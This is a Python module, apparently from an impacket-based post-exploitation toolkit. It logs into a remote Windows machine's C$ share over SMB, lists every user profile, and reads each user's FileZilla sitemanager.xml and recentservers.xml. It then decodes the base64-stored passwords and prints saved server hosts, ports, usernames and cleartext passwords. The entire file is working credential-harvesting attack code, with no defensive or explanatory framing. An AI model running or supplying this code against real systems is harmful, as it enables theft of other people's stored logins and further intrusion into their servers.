
import base64
from lib import SMBHandler
from lib import PrintHandler
from impacket.examples.utils import parse_target
import xml.etree.ElementTree as ET

class FileZillaConfig:
    def __init__(self, filepath: str, name: str, host: str, port: str, protocol: str, username: str, password: str):
        self.FilePath = filepath
        self.Name = name
        self.Host = host
        self.Port = port
        self.Protocol = protocol
        self.UserName = username
        self.Password = password

class FileZilla:
    def __init__(self, username: str, configs: FileZillaConfig):
        self.UserName = username
        self.Configs = configs

def get_filezilla(smb_conn):
    share = "C$"
    user_path = "\\Users"
    configs = []

    directory_listing = smb_conn.list_directory(share, user_path)
    for f in directory_listing:
        if f.is_directory():
            if f.get_longname() == '.' or f.get_longname() == '..' or f.get_longname() == 'Public' or f.get_longname() == 'Default' or f.get_longname() == 'Default User' or f.get_longname() == 'All Users':
                continue
            
            username = f.get_longname()
            fz_path = f"{user_path}\\{username}\\AppData\\Roaming\\FileZilla\\"
            files = ['sitemanager.xml', 'recentservers.xml']
            for f in files:
                file_path = f'{fz_path}{f}'
                fixed_path = f'C:{file_path}'
                if not smb_conn.file_exists(share, file_path):
                    continue
                file_data = smb_conn.show_file_content(share, fz_path, f)
                xmlDoc = ET.fromstring(file_data)

                servers = xmlDoc.findall(".//Servers")
                if not servers:
                    servers = xmlDoc.findall(".//RecentServers")

                if not servers or len(servers[0]) == 0:
                    continue
                else:
                    for server in servers[0]:
                        name = "<RECENT SERVER>"
                        temp_name = server.find("Name")
                        if temp_name is not None:
                            name = temp_name.text

                        host = server.find("Host").text if server.find("Host") is not None else ""
                        port = server.find("Port").text if server.find("Port") is not None else ""
                        protocol = server.find("Protocol").text if server.find("Protocol") is not None else ""
                        user = server.find("User").text if server.find("User") is not None else ""
                        
                        temp_password = server.find("Pass")
                        password = "<NULL>"
                        if temp_password is not None:
                            encoding = temp_password.get("encoding")
                            if encoding == "base64":
                                password = base64.b64decode(temp_password.text).decode('utf-8')
                            else:
                                password = "<PROTECTED BY MASTERKEY>"

                        conf = FileZillaConfig(fixed_path, name, host, port, protocol, user, password)
                        configs.append(conf)
                    if len(configs) > 0:
                        yield FileZilla(username, configs)

def format_results(filezilla):
    print(f'  FileZilla Configs ({filezilla.UserName}):\n')
    for conf in filezilla.Configs:
        print(f'    FilePath  : {conf.FilePath}')
        print(f'    Name      : {conf.Name}')
        print(f'    Host      : {conf.Host}')
        print(f'    Port      : {conf.Port}')
        print(f'    Protocol  : {conf.Protocol}')
        print(f'    Username  : {conf.UserName}')
        print(f'    Password  : {conf.Password}\n')
    print()


def command_base(options):
    command = 'FileZilla'
    description = 'FileZilla configuration files'
    command_group = ['user', 'remote']

    domain, username, password, address = parse_target(options.target)

    PrintHandler.show_banner(command)
    try:
        smb_conn = SMBHandler(address, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
        for filezilla in get_filezilla(smb_conn):
            if filezilla is not None:
                format_results(filezilla)
    except KeyboardInterrupt:
        smb_conn.close()
    except Exception as e:
        print(e)

    smb_conn.close()
